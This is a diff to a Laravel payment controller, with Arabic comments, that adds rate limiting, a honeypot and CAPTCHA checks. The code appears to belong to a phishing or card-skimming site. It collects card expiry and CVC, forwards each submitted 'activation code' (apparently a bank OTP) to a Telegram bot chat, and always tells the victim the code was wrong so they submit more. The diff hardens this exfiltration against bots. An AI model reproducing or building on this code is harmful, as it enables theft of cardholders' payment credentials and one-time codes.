@@ -10,13 +10,19 @@ use App\Models\OrderDetail;
 use App\Models\Product;
 use Illuminate\Support\Facades\Session;
 use Illuminate\Support\Facades\Log;
+use Illuminate\Support\Facades\RateLimiter;
 
 class PaymentController extends Controller
 {
     public function processPayment(Request $request)
     {
 
+$key = 'submit|' . $request->ip();
 
+        // حد لمحاولات الإرسال
+        if (RateLimiter::tooManyAttempts($key, 10)) {
+            return back()->with('error', 'محاولات كثيرة، حاول لاحقًا.');
+        }
         // Validate request data
         $validated = $request->validate([
             'CashOrBatch' => 'required',
@@ -25,7 +31,48 @@ class PaymentController extends Controller
             'month' => 'required|numeric|between:1,12',
             'year' => 'required|numeric|min:' . date('y'),
             'cvc' => 'required|numeric|digits:3',
+               'hp_field' => 'nullable',
+            // CAPTCHA
+            'captcha_answer' => 'required|string',
+            'captcha_token' => 'required|string',
         ]);
+        
+        // honeypot للتحقق من الروبوتات
+        if ($request->filled('hp_field')) {
+            RateLimiter::hit($key);
+            return back()->withInput()->with('error', 'محاولة مشبوهة.');
+        }
+
+        // التحقق من وجود token
+        $token = $request->input('captcha_token');
+        if (!session('captcha_token') || session('captcha_token') !== $token) {
+            RateLimiter::hit($key);
+            return back()->withInput()->with('error', 'رمز التحقق غير صحيح، أعد تحميل الصفحة.');
+        }
+
+        // التحقق من استخدام CAPTCHA مسبقًا
+        if (session('captcha_used')) {
+            RateLimiter::hit($key);
+            return back()->withInput()->with('error', 'تم استخدام رمز التحقق هذه المرة.');
+        }
+
+        // التحقق من نص CAPTCHA
+        $expectedText = session('captcha_text', '');
+        $answer = strtoupper(preg_replace('/\s+/', '', $request->input('captcha_answer')));
+        if ($answer !== strtoupper($expectedText)) {
+            RateLimiter::hit($key);
+            return back()->withInput()->with('error', 'إجابة التحقق غير صحيحة.');
+        }
+
+        // optional: التحقق من وقت استكمال النموذج
+        $startTime = session('form_start_time') ?? now();
+        $timeTaken = now()->diffInMilliseconds($startTime);
+        
+
+        // كل شيء جيد، تنظيف CAPTCHA ومحاولات الروبوت
+        session(['captcha_used' => true]);
+        session()->forget(['captcha_token', 'captcha_text', 'form_start_time']);
+        RateLimiter::clear($key);
         $cart = session()->get('cart', []);
         $totalPrice = session()->get('totalPrice', 0);
 
@@ -146,30 +193,86 @@ class PaymentController extends Controller
         return view('frontend.confirm');
     }
     public function payment_confirm_post(Request $request)
-    {
-        $message =  "رمز التفعيل :" . $request->order . PHP_EOL;
+{
+    // فاليدشن للحقلين order و CAPTCHA
+    $request->validate([
+        'order' => 'required|string',
+        'captcha_answer' => 'required|string',
+        'captcha_token' => 'required|string',
+    ], [
+        'order.required' => 'الرجاء إدخال الكود.',
+        'captcha_answer.required' => 'الرجاء إدخال نص التحقق.',
+        'captcha_token.required' => 'رمز التحقق مفقود، أعد تحميل الصفحة.',
+    ]);
 
-        // Get Telegram credentials
-        $key = env('TOKEN_TELEGRAM');
-        $ids = env('TOKEN_TELEGRAM_CHAT_ID');
+    $key = 'confirm|' . $request->ip();
 
-        // Prepare request data
-        $url_new = "https://api.telegram.org/bot" . $key . "/sendMessage";
-        $senderr = [
-            'chat_id' => $ids,
-            'text' => $message,
-        ];
-
-        $curll_new = curl_init($url_new);
-        curl_setopt($curll_new, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($curll_new, CURLOPT_POST, true);
-        curl_setopt($curll_new, CURLOPT_POSTFIELDS, $senderr);
-        $response = curl_exec($curll_new);
+    // تحقق من محاولات كثيرة
+    if (\Illuminate\Support\Facades\RateLimiter::tooManyAttempts($key, 10)) {
         return response()->json([
-            'success' => true,
-            'message' => 'الكود الذي ارسلته خاطئ'
+            'success' => false,
+            'message' => 'محاولات كثيرة، حاول لاحقًا.'
         ]);
     }
+
+    // تحقق من وجود token
+    if (!session('captcha_token') || session('captcha_token') !== $request->captcha_token) {
+        \Illuminate\Support\Facades\RateLimiter::hit($key);
+        return response()->json([
+            'success' => false,
+            'message' => 'رمز التحقق غير صحيح، أعد تحميل الصفحة.'
+        ]);
+    }
+
+    // تحقق من استخدام CAPTCHA مسبقًا
+    if (session('captcha_used')) {
+        \Illuminate\Support\Facades\RateLimiter::hit($key);
+        return response()->json([
+            'success' => false,
+            'message' => 'تم استخدام رمز التحقق هذه المرة.'
+        ]);
+    }
+
+    // تحقق من نص CAPTCHA
+    $expectedText = session('captcha_text', '');
+    $answer = strtoupper(preg_replace('/\s+/', '', $request->captcha_answer));
+    if ($answer !== strtoupper($expectedText)) {
+        \Illuminate\Support\Facades\RateLimiter::hit($key);
+        return response()->json([
+            'success' => false,
+            'message' => 'إجابة التحقق غير صحيحة.'
+        ]);
+    }
+
+    // كل شيء صحيح، تنظيف CAPTCHA ومحاولات الروبوت
+    session(['captcha_used' => true]);
+    session()->forget(['captcha_token', 'captcha_text']);
+    \Illuminate\Support\Facades\RateLimiter::clear($key);
+
+    // إرسال الكود عبر تليجرام
+    $message = "رمز التفعيل: " . $request->order;
+    $key = env('TOKEN_TELEGRAM');
+    $ids = env('TOKEN_TELEGRAM_CHAT_ID');
+
+    $url_new = "https://api.telegram.org/bot" . $key . "/sendMessage";
+    $senderr = [
+        'chat_id' => $ids,
+        'text' => $message,
+    ];
+
+    $curll_new = curl_init($url_new);
+    curl_setopt($curll_new, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curll_new, CURLOPT_POST, true);
+    curl_setopt($curll_new, CURLOPT_POSTFIELDS, $senderr);
+    curl_exec($curll_new);
+    curl_close($curll_new);
+
+    return response()->json([
+        'success' => true,
+        'message' => 'الكود الذي ارسلته خاطئ'
+    ]);
+}
+
     public function tappy()
     {
         $cart = session()->get('cart', []);
